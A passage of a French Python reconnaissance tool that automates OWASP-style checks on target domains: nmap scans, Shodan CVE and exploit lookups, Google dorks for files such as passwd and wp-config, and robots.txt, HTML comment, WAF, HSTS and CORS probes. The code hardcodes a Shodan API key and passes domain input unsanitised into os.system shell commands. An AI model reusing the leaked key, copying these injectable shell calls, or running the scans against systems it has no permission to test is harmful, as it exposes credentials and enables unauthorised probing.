         domaine.checkEnTetesHTTP()

    def RECOMMANDATIONS_1(self):
     banniere("Fichiers d'installation par défaut")
     objectif()
     print("Vérifications qu'il 'y a pas de fichiers d'installation. ")
     print(" - Drupal")
     print(" - TYPO3")

     test()

     print_action("Fichiers DRUPAL par défaut?")
     for domaine in self.__AllDomains:
         domaine.reqGetHTTP(self.__DEFAULT_FILES_DRUPAL,"RECOMMANDATION_001")
         domaine.reqGetHTTPS(self.__DEFAULT_FILES_DRUPAL,"RECOMMANDATION_001")

     print_action("Fichiers TYPO3 par défault")
     for domaine in self.__AllDomains:
         domaine.reqGetHTTP(self.__DEFAULT_FILES_TYPO3,"RECOMMANDATION_001")
         domaine.reqGetHTTPS(self.__DEFAULT_FILES_TYPO3,"RECOMMANDATION_001")

    def DOMAINES(self):

        ##Check dependencies : install sudomy
         if os.path.isfile('/opt/Sudomy/sudomy'):
            pass        
         else:
            try:
                print_action("Installation du répertoire Sudomy de github dans /opt ...")
                os.system("cd /opt/ && git clone --recursive https://github.com/screetsec/Sudomy.git && cd Sudomy && pip3 install -r requirements.txt")
                print_green("Done!")
                print_action("apt-get update && apt-get install jq nmap phantomjs golang npm")
                os.system("apt-get update && \
                apt-get install jq nmap phantomjs golang npm")
                print_green("Done!")
                print_action("Ajout de la clef SHODAN_API dans sudomy.api : <TOKEN_SHODAN>")
                #os.system("sed -i -r 's/SHODAN_API.*/SHODAN_API=\"<TOKEN_SHODAN>\"/g' /opt/Sudomy/sudomy.api")
                print_green("Done!")
            except:
                os.system("rm -rf /opt/Sudomy/")

         end = "y"
         while end == "y" or end == "Y" :
            try:
                domaine=demandeDOMAINE()
            except :
                print("Bye")
            

            os.system("export GOPATH=$HOME/go && \
                export PATH=$PATH:$GOROOT/bin:$GOPATH/bin && \
                go get -u github.com/tomnomnom/httprobe && \
                go get -u github.com/OJ/gobuster && \
                cd /opt/Sudomy/ && \
                ./sudomy -sC -rS -sS -d "+domaine)
           

            end=input("[+] Voulez-vous analyser un autre domaine? [yY/nN] ")
            




class Domaine:
    """ Domaine to test for all owasp categories """

    """ Init domaine """
    def __init__(self,name):
        self.__name = name
        self.__PORTS = []
        self.__HTTP = []
        self.__HTTPS = []
        self.__NMAP_port = ""
        self.__SERVICES = []
        self.__USERNAME = ""
        self.__PASSWORD = ""
        self._Affichage_OTG = Affichage_OTG()


    def getName(self):
        return self.__name

    def getServicesInfo(self):
        if len(self.__HTTP) == 0 or len(self.__HTTPS) == 0:
            print_domaine("Hôte : "+self.__name)
        elif len(self.__SERVICES) == 0:
            print_info("Pas de service detecté")
        for service in self.__SERVICES:
            service.getInfo()

    def display(self):
        print("Domaine :"+self.__name)
        print("Open ports : ")
        for port in self.__PORTS:
            print("\t ")
        print("Liens HTTP trouvés : \n")
        for http in self.__HTTP:
            print("HTTP : "+http)
        print("Liens HTTPS trouvés : \n")
        for https in self.__HTTPS:
            print("HTTPS : "+https)
        if self.__USERNAME is not "":
            print("Nom de compte associé : "+self.__USERNAME)
        if self.__PASSWORD is not "":
            print("Mot de passe associé : "+self.__USERNAME)

    """ Add new port : Open state """
    def addPort(self,newPort):
        inside = False
        for port in self.__PORTS:
            if port == newPort:
                inside=True
        if inside == False:
            self.__PORTS.append(newPort)

    """ Add new port :  search if port open and add it if open """
    def addHypotheticalPort(self,newPort):
         np = int(newPort)
         print_action("=> Tentative d'ajout du port : "+str(np))
         print("\n")

         nm = nmap.PortScanner()
         nm.scan(hosts=str(self.__name),arguments='-sV -p'+str(np))

         host = self.__name

         print_action("Hôte : "+self.__name)               
              
         port = np
         try:
             if nm[host]['tcp'][port]['state'] == "filtered":
                 print_magenta("Port "+str(port)+" filtered")
             elif nm[host]['tcp'][port]['state'] == "open":
                 if nm[host]['tcp'][port]['name'] == "ssl":
                     self.addHTTPS("https://"+self.__name+":"+str(port))
                     self.addPort(port)
                     self.addService(Service(str(nm[host]['tcp'][port]['state']),str(port),str(nm[host]['tcp'][port]['name']),nm[host]['tcp'][port]['product']))
                     print_green("Port "+str(port)+" open - Name "+str(nm[host]['tcp'][port]['name'])+" - Produit : "+str(nm[host]['tcp'][port]['product']))
                 elif nm[host]['tcp'][port]['name'] == "http":
                     self.addHTTP("http://"+self.__name+":"+str(port))
                     self.addPort(port)
                     self.addService(Service(str(nm[host]['tcp'][port]['state']),str(port),str(nm[host]['tcp'][port]['name']),nm[host]['tcp'][port]['product']))
                     print_green("Port "+str(port)+" open - Name "+str(nm[host]['tcp'][port]['name'])+" - Produit : "+str(nm[host]['tcp'][port]['product']))
                 else:
                     pass
             else:
                 print_red("Port "+str(port)+" close")
         except:
                print_red("Port "+str(port)+" close")
    
    #Ajout d'identifiants
    def addIds(self):
        print("Hôte :"+self.__name)
        var=input("Voulez-vous ajouter des identifiants pour cet hôte? [y/n] ")
        if var == "y":
            succes = 0
            while succes == 0:
                __USERNAME=input("Nom de compte : ")
                __PASSWORD=input("Mot de passe : ")
                res=input("Validez-vous les choix précédents ? [y/n]")
                if res != "n":
                    succes=1
        elif var == "n":
            pass
        else:
            pass

    """ Add new http link """
    def addHTTP(self,link):
        self.__HTTP.append(link)

        """ Get HTTP list"""
    def getHTTP(self):
        return self.__HTTP

    """ Add new https link """
    def addHTTPS(self,link):
        self.__HTTPS.append(link)

    """ Get HTTPS list"""
    def getHTTPS(self):
        return self.__HTTPS

    """ Add new service link """
    def addService(self,Service):
        try:
            self.__SERVICES.append(Service)
        except:
            print_red("Problème à l'ajout du service : "+Service.getInfo())


    def searchPorts(self,hypotheticalPorts):
        #création du string du parametre hosts de la fonction scan() de nmap : nmap_ports
         nmap_ports=""
         for x in range(len(hypotheticalPorts)):
             nmap_ports=nmap_ports+str(hypotheticalPorts[x])+","

         print("\n")  
         print_action("=> Reperage des ports : "+nmap_ports)
         print("\n")

         nm = nmap.PortScanner()
         nm.scan(hosts=str(self.__name),arguments=' -p'+nmap_ports)

         #host = self.__name

         for host in nm.all_hosts():
             print_action("Hôte : "+self.__name)               
             for port in hypotheticalPorts:
                try:
                 if nm[host]['tcp'][port]['state'] == "filtered":
                     print_magenta("Port "+str(port)+" filtered")
                 elif nm[host]['tcp'][port]['state'] == "open":
                     if "ssl" in nm[host]['tcp'][port]['name'] or "https" in nm[host]['tcp'][port]['name']:
                         self.addHTTPS("https://"+self.__name+":"+str(port))
                         self.addPort(port)
                         self.addService(Service(str(nm[host]['tcp'][port]['state']),str(port),str(nm[host]['tcp'][port]['name']),nm[host]['tcp'][port]['product']))
                         print_green("Port "+str(port)+" open - Name "+str(nm[host]['tcp'][port]['name'])+" - Produit : "+str(nm[host]['tcp'][port]['product']))
                     elif "http" in nm[host]['tcp'][port]['name']:
                         self.addHTTP("http://"+self.__name+":"+str(port))
                         self.addPort(port)
                         self.addService(Service(str(nm[host]['tcp'][port]['state']),str(port),str(nm[host]['tcp'][port]['name']),nm[host]['tcp'][port]['product']))
                         print_green("Port "+str(port)+" open - Name "+str(nm[host]['tcp'][port]['name'])+" - Produit : "+str(nm[host]['tcp'][port]['product']))
                     else:
                         print_red("[!!!] Nom inconnu : "+str(port)+" "+str(nm[host]['tcp'][port]['name'])+" "+str(nm[host]['tcp'][port]['product']))
                 else:
                     print_red("Port "+str(port)+" close")
                except:
                     print_red("Port "+str(port)+" close")

    """    Fonction de allOTG ()      """
    def DisplayAllResults(self):
        print("Nom de domaine :"+self.__name+"\n")
        self._Affichage_OTG.DisplayAllResults()



    """    Fonction de OTG_INFO_001      """
    
    def checkReconnaissance(self):
      print("Nom de domaine :"+self.__name+"\n")

      print_banniere("--------------------------------")
      print_banniere("|                              |")
      print_banniere("|           SHODAN             |")
      print_banniere("|                              |")
      print_banniere("--------------------------------")

      SHODAN_API_KEY= "wgbAfdKjEfYXEizjt9Ow1oEixrMwApg2" #Go on shodan => Mon compte => API KEY
      api = shodan.Shodan(SHODAN_API_KEY)
      target = self.__name
      dnsResolve = 'https://api.shodan.io/dns/resolve?hostnames=' +  target + '&key=' + SHODAN_API_KEY

      try:    
          # First we need to resolve our targets domain to an IP    
          resolved = requests.get(dnsResolve)    
          hostIP = resolved.json()[target]
          
          # Then we need to do a Shodan search on that IP    
          host = api.host(hostIP)  
          print_action("Recherche de "+self.__name+" sur shodan")  
          print("IP: %s" % host['ip_str'])  
          print("Organization: %s" % host.get('org', 'n/a'))    
          print("Operating System: %s" % host.get('os', 'n/a'))
        
          # Print all banners
          print_action("Affichage de toutes les bannières:") 
          for item in host['data']:        
            print("Port: %s" % item['port'])       
            print("Banner: %s" % item['data'])

          
          # Print vuln information
          description = ""
          if len(host['vulns']) > 0:              
              print_action("Affichage de toutes les vulnérabilités trouvées:")                   
              for item in host['vulns']:        
                CVE = item.replace('!','')  
                description= description + CVE + " ; "      
                print_green('vulnérabilité : %s' % item)       
                exploits = api.exploits.search(CVE)        
                for item in exploits['matches']:            
                    if item.get('cve')[0] == CVE:                
                        print(item.get('description') )

                #_Affichage_OTG.setOTG_INFO(1,"KO","Vulns trouvées : "+description)
                self._Affichage_OTG.setOTG_INFO(1,"KO",description)

          else:
              print_red("Aucune vulnérabilité trouvé pour "+self.__name)
              self._Affichage_OTG.setOTG_INFO(1,"OK","")
      except:    
        print_red("Une erreur est apparue")
        self._Affichage_OTG.setOTG_INFO(1,"OK","-")

      print("\n")
      print("Exemple de Google Dorks:")

      print("********* Documents: *********")
      print("site:"+self.__name+" ext:(doc | docx | odt | odp | ods | odg | pst | ost | pdf | ps | psw | pps | ppt | pptx | xls | xlslx | xlt | xlsx | xml | csv | dat | rtf | dot | eml | eps | log | txt | sxw | sml | yml | yaml | xla | reg)")
      print("********* Donnees sensibles: *********")
      print("site:"+self.__name+" ext:(bak | log | mdb | db | txt | sql | tar | zip | config | conf | ini | exe | reg ) inurl: \"htaccess|shadow|htusers|account|users|admin|administrators|passwd|password|wp-config|maillog\"")
      print("site:"+self.__name+" intext:\"confidentiel\" ext:pdf")
      print("site:"+self.__name+" intext:\"secret\" ext:pdf")
      print("*********Archives : *********")
      print("site:"+self.__name+" ext:( 7z | cab | gz | lha | lzh | rar | tar | zip )")
      print("********* Fichiers systemes: *********")
      print("site:"+self.__name+" ext:( bat | exe | dll | log | lib | lnk | sys)")
      print("********* Listage des repertoires: *********")
      print("site:"+self.__name+" intitle: \"Index of\"")
      print("site:"+self.__name+" intitle: \"Parent Directory\"")


    
    """    Fonction de OTG_INFO_002      """

    def bannerServer(self,HTTPServerHeaders):
          if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
            description = ""

          if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
               print_action("Requete HTTP : "+http_req)
               r = requests.get(http_req)
               self._Affichage_OTG.setOTG_INFO(2,"OK","")
               for head in HTTPServerHeaders:
                try:
                    resultat = r.headers[head]                   
                    
                    versions = re.findall(r'\d[0-9a-zA-Z._:-]+',resultat)   
                    if  versions[0] is not None:
                        description = description + resultat + " ; "
                        self._Affichage_OTG.setOTG_INFO(2,"KO",description)
                        print_red("%s : %s" % (head, r.headers[head]))                                    
                except:
                    print_red("%s: Not Found" % head)

          if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
               print_action("Requete HTTPS : "+https_req)

               self._Affichage_OTG.setOTG_INFO(2,"OK","")
               r = requests.get(https_req, verify=False)
               for head in HTTPServerHeaders:
                try:
                    resultat = r.headers[head]

                    versions = re.findall(r'\d[0-9a-zA-Z._:-]+',resultat)   
                    if  versions[0] is not None:
                        description = description + resultat + " ; "
                        self._Affichage_OTG.setOTG_INFO(2,"KO",description)
                        print_red("%s : %s" % (head, r.headers[head]))
                except:
                    print_red("%s: Not Found" % head)

    """    Fonction de OTG_INFO_003      """

    def fileRobots(self):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)

        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
               print_action("Robots.txt HTTP : "+http_req)
               
               r = requests.get(http_req+"/robots.txt")
               
               if r.status_code == 200:
                    print_green("Success : "+http_req+"/robots.txt")
                    print(r.text)
                    self._Affichage_OTG.setOTG_INFO(3,"KO","Fichier "+http_req+"/robots.txt trouvés.")
               else:
                    print_red("Failed - Pas de Fichier /robots")
                    self._Affichage_OTG.setOTG_INFO(3,"OK","-")

        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
               print_action("Robots.txt HTTPS : "+https_req)
               
               r = requests.get(https_req+"/robots.txt", verify=False)
               
               if r.status_code == 200:
                    print_green("Success : "+https_req+"/robots.txt")
                    print(r.text)
                    self._Affichage_OTG.setOTG_INFO(3,"KO","Fichier "+https_req+"/robots.txt trouvés.")
               else:
                    print_red("Failed - Pas de Fichier /robots")
                    self._Affichage_OTG.setOTG_INFO(3,"OK","-") 

    """    Fonction de OTG_INFO_004      """

    def allServicesNmap(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=self.__name,arguments='-p-')
        nmap_ports = ""

         #host = self.__name

        for host in nm.all_hosts():
             print_action("Hôte : "+self.__name)               
             for port in nm[host]['tcp'].keys():
                try:
                 if nm[host]['tcp'][port]['state'] == "filtered":
                     print_magenta("Port "+str(port)+" filtered")
                 elif nm[host]['tcp'][port]['state'] == "open":
                     if "ssl" in nm[host]['tcp'][port]['name'] or "https" in nm[host]['tcp'][port]['name']:
                         self.addHTTPS("https://"+self.__name+":"+str(port))
                         self.addService(Service(str(nm[host]['tcp'][port]['state']),str(port),str(nm[host]['tcp'][port]['name']),nm[host]['tcp'][self.__name]['product']))
                         print_green("port : %s,\tproduit : %s" % (port, nm[host]['tcp'][port]['product']))
                         self.addPort(port)
                         if port is not 80 and port is not 443:
                            nmap_ports = nmap_ports + str(port) + " ; "
                     elif "http" in nm[host]['tcp'][port]['name']:
                         self.addHTTP("http://"+self.__name+":"+str(port))
                         self.addService(Service(str(nm[host]['tcp'][port]['state']),str(port),str(nm[host]['tcp'][port]['name']),nm[host]['tcp'][self.__name]['product']))
                         print_green("port : %s,\tproduit : %s" % (port, nm[host]['tcp'][port]['product']))
                         self.addPort(port)
                         if port is not 80 and port is not 443:
                            nmap_ports = nmap_ports + str(port) + " ; "
                     else:
                         print_red("[!!!] Nom inconnu : "+str(port)+" "+str(nm[host]['tcp'][port]['name'])+" "+str(nm[host]['tcp'][port]['product']))
                 else:
                     print_red("Port "+str(port)+" close")
                except:
                     print_red("Port "+str(port)+" close")

        '''

        for host in nm.all_hosts():
            print_action("Hôte : "+self.__name)
            for port in nm[host]['tcp'].keys():
                    if nm[host]['tcp'][port]['state'] is "open":
                        if nm[host]['tcp'][port]['name'] == "ssl" or nm[host]['tcp'][port]['name'] == "https":
                         self.addHTTPS("https://"+self.__name+":"+str(port))
                         self.addService(Service(str(nm[host]['tcp'][port]['state']),str(port),str(nm[host]['tcp'][port]['name']),nm[host]['tcp'][self.__name]['product']))
                         print_green("port : %s,\tproduit : %s" % (port, nm[host]['tcp'][port]['product']))
                         self.addPort(port)
                         if port is not 80 and port is not 443:
                            nmap_ports = nmap_ports + str(port) + " ; "
                            
                        elif nm[host]['tcp'][port]['name'] == "http":
                         self.addHTTP("http://"+self.__name+":"+str(port))
                         self.addService(Service(str(nm[host]['tcp'][port]['state']),str(port),str(nm[host]['tcp'][port]['name']),nm[host]['tcp'][self.__name]['product']))
                         print_green("port : %s,\tproduit : %s" % (port, nm[host]['tcp'][port]['product']))
                         self.addPort(port)

                         if port is not 80 and port is not 443:
                            nmap_ports = nmap_ports + str(port) + " ; "

                    else:
                         pass
        '''

        if len(nmap_ports) is not 0:
            self._Affichage_OTG.setOTG_INFO(4,"KO","Applications également accessible : "+nmap_ports)
        else:
            self._Affichage_OTG.setOTG_INFO(4,"OK","-")


        print("Ouvrir chaque application : nom_de_domaine:ports precedents et verifier la legitimite de l'appli.")

    """    Fonction de OTG_INFO_005      """

    def checkCommentaires(self,SENSITIVE_COMMENTS):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)

        description = ""

        urls = []

        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
                url = requests.get(http_req)
                commentaires = re.findall('<!--(.*)-->',url.text)
                if len(commentaires) is not 0:
                    print_action("Commentaire de "+http_req)  
                for comments in commentaires:  
                    print(comments)                                     
                    for sensitive_comment in SENSITIVE_COMMENTS:
                        if sensitive_comment.lower() in comments.lower():
                            description = description + comments + " ; "                    

                soup = BeautifulSoup(url.text,'features="lxml"')
                for line in soup.find_all('a'):
                    newline=line.get('href')
                    try:        
                        if newline[:4] == "http":            
                            if http_req in newline:                
                                urls.append(str(newline))
                                print_info("Page "+newline+" trouvée.")        
                            elif newline[:1] == "/":            
                                combline = http_req+newline            
                                urls.append(str(combline))
                                print_info("Page "+combline+" trouvée.")     
                    except:        
                        pass        
                for uurl in urls:    
                    print_action("Commentaire de "+uurl)    
                    url = requests.get(uurl)    
                    commentaires = re.findall('<!--(.*)-->',url.text)    
                    for comments in commentaires:
                        print(comments)
                        for sensitive_comment in SENSITIVE_COMMENTS:
                            if sensitive_comment.lower() in comments.lower():
                                description = description + comments + " ; "


        urls = []

        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
                url = requests.get(https_req,verify=False)
                commentaires = re.findall('<!--(.*)-->',url.text)
                if len(commentaires) is not 0:
                    print_action("Commentaire de "+https_req)  
                for comments in commentaires:
                    print(comments)
                    for sensitive_comment in SENSITIVE_COMMENTS:
                        if sensitive_comment.lower() in comments.lower():
                            description = description + comments + " ; "     
                soup = BeautifulSoup(url.text,'features="lxml"')
                for line in soup.find_all('a'):
                    newline=line.get('href')
                    try:        
                        if newline[:4] == "http":            
                            if https_req in newline:                
                                urls.append(str(newline))
                                print_info("Page "+newline+" trouvée.")        
                            elif newline[:1] == "/":            
                                combline = https_req+newline            
                                urls.append(str(combline))
                                print_info("Page "+combline+" trouvée.")     
                    except:        
                        pass        
                for uurl in urls:    
                    print_action("Commentaire de "+uurl)    
                    url = requests.get(uurl,verify=False)    
                    commentaires = re.findall('<!--(.*)-->',url.text)    
                    for comments in commentaires:
                        print(comments)   
                        for sensitive_comment in SENSITIVE_COMMENTS:
                            if sensitive_comment.lower() in comments.lower():
                                description = description + comments + " ; " 

        if len(description) is 0:
            self._Affichage_OTG.setOTG_INFO(5,"OK","-")
        else:
            self._Affichage_OTG.setOTG_INFO(5,"KO",description)


    """Fonction de OTG_CONFIG_002, OTG_CONFIG_004 , OTG_CONFIG_005"""
    def reqGetHTTP(self,files,OTG_NAME):
        if len(self.__HTTP) != 0:
            description = ""
            print_domaine("Hôte : "+self.__name)
            for http_req in self.__HTTP:
               for file in files:    
                    description = description + requeteHTTP(http_req,file)
            if len(description) is 0:
                self._Affichage_OTG.setAffichageOTG(OTG_NAME,"OK","-")
            else:
                self._Affichage_OTG.setAffichageOTG(OTG_NAME,"KO",description)

    def reqGetHTTPS(self,files,OTG_NAME):
        if len(self.__HTTPS) != 0:
            description = ""
            print_domaine("Hôte : "+self.__name)
            for https_req in self.__HTTPS: 
               for file in files:    
                    description = description + requeteHTTPS(https_req,file)
            if len(description) is 0:
                self._Affichage_OTG.setAffichageOTG(OTG_NAME,"OK","-")
            else:
                self._Affichage_OTG.setAffichageOTG(OTG_NAME,"KO",description)
    
    """    Fonction de OTG_INFO_008      """
    def checkFramework(self,FRAMEWORKS):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)

        description = ""

        succes = 0
        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:           
               print_action("Requête HTTP : "+http_req)
               
               r = requests.get(http_req)
               
               if r.status_code == 200:
                    for framework in FRAMEWORKS:
                         if framework.lower() in r.text.lower():
                              print_green("Success : "+framework+" found in "+http_req)
                              description = description + " Framework : " + framework + " ; "                              
                              succes = 1
               else:
                    print_red("Impossible d'accéder à la page "+http_req+".")

            if succes == 0:
                print_red("Aucun Framework trouvé sur toutes les pages http.")

        succes = 0
        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:           
               print_action("Requête HTTPS : "+https_req)
               
               r = requests.get(https_req)
               
               if r.status_code == 200:
                    for framework in FRAMEWORKS:
                         if framework.lower() in r.text.lower():
                              print_green("Success : "+framework+" found in "+https_req)
                              description = description + " Framework : " + framework + " ; "  
                              succes = 1
               else:
                    print_red("Impossible d'accéder à la page "+https_req+".")

        if succes == 0:
            print_red("Aucun Framework trouvé sur toutes les pages https.")
        
        if len(description) is 0:
            self._Affichage_OTG.setOTG_INFO(8,"OK","-")
        else:
            self._Affichage_OTG.setOTG_INFO(8,"KO",description)

    """    Fonction de OTG_INFO_009      """
    def checkApplication(self,APPLICATIONS):        
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
        succes = 0
        description = ""

        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
               r = requests.get(http_req)           
               if r.status_code == 200:
                    for app in APPLICATIONS:
                         if app.lower() in r.text.lower():
                              print_action("Recherche de l'application dans "+http_req)
                              print_green("Success : "+app+" found in "+http_req)
                              description = description + "App : "+ app + " ; "
                              succes = 1
               else:
                    print_red("["+str(r.status_code)+"] - Page "+http_req+" not found.")
            if succes == 0:
                print_red("Aucune application trouvée sur toutes les pages http.")

        succes = 0
        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:           
               r = requests.get(https_req,verify=False)
               if r.status_code == 200:                
                    for app in APPLICATIONS:
                         if app.lower() in r.text.lower():
                              print_action("Recherche de l'application dans "+https_req)
                              print_green("Success : "+app+" found in "+https_req)
                              description = description + "App : "+ app + " ; "
                              succes = 1
               else:
                    print_red("["+str(r.status_code)+"] - Page "+http_req+" not found.")

        if succes == 0:
            print_red("Aucune application trouvée sur toutes les pages http.")

        if len(description) is 0:
            self._Affichage_OTG.setOTG_INFO(9,"OK","-")
        else:
            self._Affichage_OTG.setOTG_INFO(9,"KO",description)

    """    Fonction de OTG_INFO_010      """

    def checkFirewall(self):       
              if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
                  print_domaine("Hôte : "+self.__name)

              description = ""

              if len(self.__HTTP) != 0:
                for http_req in self.__HTTP:
                   print_action("Commande : wafw00f -vv "+http_req)
                   
                   cmd = "wafw00f -vv "+http_req
                   name_file = "wafw00f-"+http_req 
                   n = name_file.replace('//','-')
                   n2 = n.replace(':','-')

                   print_green("Ecriture dans le fichier : "+os.getcwd()+"/"+n2)

                   with open(os.getcwd()+"/"+n2, 'wb') as logfile:
                       p = subprocess.Popen(shlex.split(cmd), stdout=logfile, stderr=logfile, bufsize=1) 
                       p.wait()
                   print_green("Fin de l'écriture du fichier : "+os.getcwd()+"/"+n2)
                   
                   with open(os.getcwd()+"/"+n2) as f:
                        if "No WAF detected" in f.read():
                           pass
                        else:                           
                            description = description + "Waf dans le fichier "+os.getcwd()+"/"+n2+" ; "

              if len(self.__HTTPS) != 0:
                for https_req in self.__HTTPS:
                   print_action("Commande : wafw00f -vv "+https_req)
                   
                   cmd = "wafw00f -vv "+https_req
                   name_file = "wafw00f-"+https_req 
                   n = name_file.replace('//','-')
                   n2 = n.replace(':','-')

                   print_green("Ecriture dans le fichier : "+os.getcwd()+"/"+n2)

                   with open(os.getcwd()+"/"+n2, 'wb') as logfile:
                       p = subprocess.Popen(shlex.split(cmd), stdout=logfile, stderr=logfile, bufsize=1) 
                       p.wait()
                   print_green("Fin de l'écriture du fichier : "+os.getcwd()+"/"+n2)
                   
                   with open(os.getcwd()+"/"+n2) as f:
                        if "No WAF detected" in f.read():
                           pass
                        else:                           
                            description = description + "Waf dans le fichier "+os.getcwd()+"/"+n2+" ; "

              if len(description) is 0:
                self._Affichage_OTG.setOTG_INFO(10,"OK","-")
              else:
                self._Affichage_OTG.setOTG_INFO(10,"KO",description)

    """    Fonction de OTG_CONFIG_001      """
    def checkTCPTIMESTAMPS(self):
          if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
          description = ""
          print_action("Lancement de la commande : #hping3 "+self.__name+" -S -c 1 -p 443 --tcp-timestamp :")
          cmd= "hping3 "+self.__name+" -S -c 1 -p 443 --tcp-timestamp > "+os.getcwd()+"/"+self.__name+".tmp 2>&1"
          os.system(cmd)
          with open(os.getcwd()+"/"+self.__name+".tmp") as myfile:
            if "TCP timestamp" in myfile.read():
                print_red("Absence du TCP Timestamps")
                self._Affichage_OTG.setOTG_CONFIG(1,"KO","Absence du TCP Timestamps")

            else:
                print_green("Présence du TCP Timestamps")
                self._Affichage_OTG.setOTG_CONFIG(1,"OK","Présence du TCP Timestamps")

          os.system("rm "+os.getcwd()+"/"+self.__name+".tmp")

    """    Fonction de OTG_CONFIG_006      """
    def checkHTTPMethods(self):
          nm = nmap.PortScanner()
          if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)  
          port_nmap = ""
          description = ""
          TRACE = 0

          print("Lancement de la commande : nmap -p "+self.__NMAP_port+" --script http-methods "+self.__name)
          nm.scan(hosts=self.__name,arguments=' --script http-methods')

          for host in nm.all_hosts():
              print_action("Hôte : "+self.__name)
              try: 
                  for port in nm[host]['tcp'].keys():
                    try:
                        if "GET" in str(nm[host]['tcp'][port]['script']['http-methods']):         
                              print("port : %s,\tproduit : %s,\tméthodes : %s" % (port,nm[host]['tcp'][port]['product'], nm[host]['tcp'][port]['script']['http-methods']))
                        elif "POST" in str(nm[host]['tcp'][port]['script']['http-methods']):         
                              print("port : %s,\tproduit : %s,\tméthodes : %s" % (port,nm[host]['tcp'][port]['product'], nm[host]['tcp'][port]['script']['http-methods']))
                        else:
                            if "TRACE" in str(nm[host]['tcp'][port]['script']['http-methods']):
                                print_red("port : %s,\tproduit : %s,\tméthodes : %s" % (port,nm[host]['tcp'][port]['product'], nm[host]['tcp'][port]['script']['http-methods']))
                                TRACE = 1
                            elif "PUT" in str(nm[host]['tcp'][port]['script']['http-methods']):
                                print_red("port : %s,\tproduit : %s,\tméthodes : %s" % (port,nm[host]['tcp'][port]['product'], nm[host]['tcp'][port]['script']['http-methods']))
                            else:
                                print_red("port : %s,\tproduit : %s,\tméthodes : %s" % (port,nm[host]['tcp'][port]['product'], nm[host]['tcp'][port]['script']['http-methods']))
                    except :
                         pass
              except:
                    pass

          if TRACE is 0:
              self._Affichage_OTG.setOTG_CONFIG(6,"OK","Pas de méthode TRACE")
          else:
              self._Affichage_OTG.setOTG_CONFIG(6,"KO","Présence du la méthode TRACE")

    """    Fonction de OTG_CONFIG_007      """
    def checkHSTS(self):         
      if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
      description = ""
      if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
               strict = 0
               print("Lancement de a commande : curl -s -D- "+http_req+" | grep Strict")
               r = requests.get(http_req)
               for head in r.headers:
                    if "Strict" in head:
                         print_green(head+" : "+r.headers[head]+" - Page : "+http_req)
                         strict=1
                    elif "strict" in head:
                         print_green(head+" : "+r.headers[head]+" - Page : "+http_req)
                         strict=1
               if not strict:
                    print_red("Pas de header Strict-Transport-Security : "+http_req)
                    description = description + "Pas de HSTS sur "+http_req + " ; "

      if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
               strict = 0
               print("Lancement de a commande : curl -s -D- "+https_req+" | grep Strict")
               r = requests.get(https_req, verify=False)
               for head in r.headers:
                    if "Strict" in head:
                         print_green(head+" : "+r.headers[head]+" - Page : "+https_req)
                         strict=1
                    elif "strict" in head:
                         print_green(head+" : "+r.headers[head]+" - Page : "+https_req)
                         strict=1
               if not strict:
                    print_red("Pas de header Strict-Transport-Security : "+https_req)
                    description = description + "Pas de HSTS sur "+https_req + " ; "
      
      if len(description) is 0:
        self._Affichage_OTG.setOTG_CONFIG(7,"OK","-")
      else:
        self._Affichage_OTG.setOTG_CONFIG(7,"KO",description)

    """    Fonction de OTG_CONFIG_008      """
    def checkCORS(self):
        if len(self.__HTTP) != 0 or len(self.__HTTPS) != 0:
            print_domaine("Hôte : "+self.__name)
        description = ""
        if len(self.__HTTP) != 0:
            for http_req in self.__HTTP:
               cmd="curl -XGET "+http_req+" -I -H \"Origin: www.fidens.com\" -k -L"
               os.system(cmd)

               name_file = "cors-"+http_req 
               n = name_file.replace('//','-')
               n2 = n.replace(':','-')

               print_action("Lancement de la commande \""+cmd+"\" associée au nom "+self.__name+" ...")
               print_green("Ecriture dans le fichier : "+os.getcwd()+"/"+n2)
               with open(os.getcwd()+"/"+n2, 'wb') as logfile:
                   p = subprocess.Popen(shlex.split(cmd), stdout=logfile, stderr=logfile, bufsize=1) 
                   p.wait()
               print_green("Fin de l'écriture du fichier : "+os.getcwd()+"/"+n2)

               with open(os.getcwd()+"/"+n2) as f:
                   if "Access-Control-Allow-Origin : www.fidens.com" in f.read():
                       description = description + "CORS : "+http_req+" ; "
                   else:   
                        pass                        
                        

        if len(self.__HTTPS) != 0:
            for https_req in self.__HTTPS:
               cmd="curl -XGET "+https_req+" -I -H \"Origin: www.fidens.com\" -k -L"
               os.system(cmd)

               name_file = "cors-"+https_req 
               n = name_file.replace('//','-')
               n2 = n.replace(':','-')

               print_action("Lancement de la commande \""+cmd+"\" associée au nom "+self.__name+" ...")
               print_green("Ecriture dans le fichier : "+os.getcwd()+"/"+n2)
               with open(os.getcwd()+"/"+n2, 'wb') as logfile:
                   p = subprocess.Popen(shlex.split(cmd), stdout=logfile, stderr=logfile, bufsize=1) 
                   p.wait()
               print_green("Fin de l'écriture du fichier : "+os.getcwd()+"/"+n2)

               with open(os.getcwd()+"/"+n2) as f:
                   if "Access-Control-Allow-Origin : www.fidens.com" in f.read():
                       description = description + "CORS : "+https_req+" ; "
                   else:   
